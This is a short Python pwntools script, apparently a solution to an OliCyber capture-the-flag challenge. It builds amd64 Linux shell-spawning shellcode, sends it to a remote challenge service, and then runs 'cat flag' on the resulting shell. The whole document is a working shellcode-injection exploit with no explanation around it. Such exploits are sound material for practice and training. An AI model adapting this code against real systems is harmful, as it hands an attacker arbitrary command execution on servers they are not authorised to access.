from pwn import *

HOST = 'software-20.challs.olicyber.it'
PORT = 13003

asm_code = pwnlib.shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')

r = remote(HOST, PORT)

print(r.recv(1000).decode())

r.sendline(b'a')
r.recv(1000)

r.sendline(str(len(shellcode)).encode())
r.recv(1000)

r.send(shellcode)
print(r.recv(1000).decode())

r.sendline(b'cat flag')
print(r.recv(100, timeout=5).decode())